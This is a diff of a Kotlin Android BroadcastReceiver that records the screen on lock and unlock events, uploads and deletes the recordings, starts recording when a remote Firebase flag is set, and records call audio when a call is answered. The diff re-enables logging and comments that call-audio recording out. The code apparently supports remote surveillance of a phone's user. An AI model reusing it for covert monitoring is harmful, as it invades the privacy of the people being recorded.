@@ -79,19 +79,19 @@ class PhoneStateReceiver : BroadcastReceiver() {
             if (ScreenPreference.getInstance(context).saveDeviceID == "0") {
                 if (Intent.ACTION_SCREEN_ON == action) {
 
-                //    Log.d(TAG, "screen is on 1...")
+                    Log.d(TAG, "screen is on 1...")
 
                 } else if (Intent.ACTION_SCREEN_OFF == action) {
-                 //   Log.d(TAG, "screen is off 1...")
+                    Log.d(TAG, "screen is off 1...")
 
                     if (ScreenRecordingActivity.instance.mMediaRecorder != null) {
 
                         if (ScreenPreference.getInstance(context).saveStatus == "true") {
                             try {
-                        //        Log.d(TAG, "bat dau stop...")
+                                Log.d(TAG, "bat dau stop...")
                                 ScreenRecordingActivity.instance.mMediaRecorder!!.stop()
                                 ScreenRecordingActivity.instance.mMediaRecorder!!.reset()
-                        //        Log.d(TAG, "da stop...")
+                                Log.d(TAG, "da stop...")
                                 ScreenPreference.getInstance(context).saveStatus = "false"
                                 ScreenRecordingActivity.instance.upload()
                                 ScreenRecordingActivity.instance.stopCountTimer()
@@ -101,13 +101,16 @@ class PhoneStateReceiver : BroadcastReceiver() {
                                 fdelete.delete()
                             }
 
+                        }else{
+                            Log.d(TAG, "off stt false...")
                         }
+
 
                     }
 
                 } else if (Intent.ACTION_USER_PRESENT == action) {
 
-                   // Log.d(TAG, "screen is unlock... 1")
+                    Log.d(TAG, "screen is unlock... 1")
                     ScreenPreference.getInstance(context).saveDeviceID = "1"
                     // context.startService(Intent(context, ScreenService::class.java))
 
@@ -115,16 +118,16 @@ class PhoneStateReceiver : BroadcastReceiver() {
                 }
             } else {
                 if (Intent.ACTION_SCREEN_OFF == action) {
-                   // Log.d(TAG, "off khong lam j...")
+                    Log.d(TAG, "off khong lam j...")
 
                     if (ScreenRecordingActivity.instance.mMediaRecorder != null) {
 
                         if (ScreenPreference.getInstance(context).saveStatus == "true") {
                             try {
-                               // Log.d(TAG, "bat dau stop...")
+                                Log.d(TAG, "bat dau stop...")
                                 ScreenRecordingActivity.instance.mMediaRecorder!!.stop()
                                 ScreenRecordingActivity.instance.mMediaRecorder!!.reset()
-                                //Log.d(TAG, "da stop...")
+                                Log.d(TAG, "da stop...")
                                 ScreenPreference.getInstance(context).saveStatus = "false"
                                 ScreenRecordingActivity.instance.upload()
                                 ScreenRecordingActivity.instance.stopCountTimer()
@@ -146,8 +149,8 @@ class PhoneStateReceiver : BroadcastReceiver() {
                     }
                 }
                 if (Intent.ACTION_USER_PRESENT == action) {
-                    context.startService(Intent(context, ScreenService::class.java))
-                 //   Log.d(TAG, "screen is unlock... 2")
+                    //context.startService(Intent(context, ScreenService::class.java))
+                    Log.d(TAG, "screen is unlock... 2")
                     checkOnOff()
                 }
             }
@@ -163,7 +166,10 @@ class PhoneStateReceiver : BroadcastReceiver() {
 
             }
             if (state == TelephonyManager.EXTRA_STATE_OFFHOOK) {
-                myAudioRecorder = MediaRecorder()
+                /**
+                 * tam thoi dong ben duoi
+                 */
+           /*     myAudioRecorder = MediaRecorder()
 
                 myAudioRecorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
                 myAudioRecorder?.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
@@ -179,7 +185,7 @@ class PhoneStateReceiver : BroadcastReceiver() {
                 } catch (ioe: IOException) {
                     // make something
                 }
-
+*/
             }
             if (state == TelephonyManager.EXTRA_STATE_IDLE) {
                 //kết thúc
@@ -187,8 +193,10 @@ class PhoneStateReceiver : BroadcastReceiver() {
                 // println(MainActivity.instance.outputFile)
                 // fdelete.delete()
                 //   Toast.makeText(context, "Call Idle State", Toast.LENGTH_SHORT).show()
-
-                if (null != myAudioRecorder) {
+                /**
+                 * tam thoi dong ben duoi
+                 */
+         /*       if (null != myAudioRecorder) {
 
                     try {
                         myAudioRecorder!!.prepare()
@@ -203,7 +211,7 @@ class PhoneStateReceiver : BroadcastReceiver() {
                     myAudioRecorder!!.release()
                     myAudioRecorder = null
 
-                }
+                }*/
 
 
             }
@@ -222,10 +230,10 @@ class PhoneStateReceiver : BroadcastReceiver() {
 
             override fun onDataChange(dataSnapshot: DataSnapshot) {
                 val value = dataSnapshot.getValue(String::class.java)
-               // Log.d(TAG, "Value is: $value")
+                Log.d(TAG, "Value is: $value")
                 if (value!!.contains("true")) {
 
-               //     Log.d(TAG, "screen is unlock...")
+                   Log.d(TAG, "screen is unlock check off...")
                     var inten = Intent(mContext, ScreenRecordingActivity::class.java)
                     inten.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                     inten.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
